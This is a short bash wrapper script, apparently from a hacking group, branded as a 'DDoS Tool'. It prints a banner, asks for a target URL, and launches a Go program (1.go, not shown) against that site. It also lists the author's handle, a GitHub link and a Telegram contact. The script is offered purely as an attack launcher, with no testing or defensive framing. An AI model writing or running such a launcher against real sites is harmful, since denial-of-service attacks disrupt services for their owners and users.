#copyright : @an_danh
# DDoS Tools Copright : an_danh
#github : https://github.com/hacker2008274
#telegram : 0978842516:@an_danh
#we are no_team

clear
figlet DDoS
echo -e "\e[3;84m[:::] ...::: DDoS Tool                 :::... [:::]"
echo -e "\e[1;34m[:::] Target (example inter the URL here : https://url.com/)  : "
read target
echo -e "\033[3;93m[:::]         This Is Anonymouse         [:::]"
sleep 5
go run 1.go -site $target
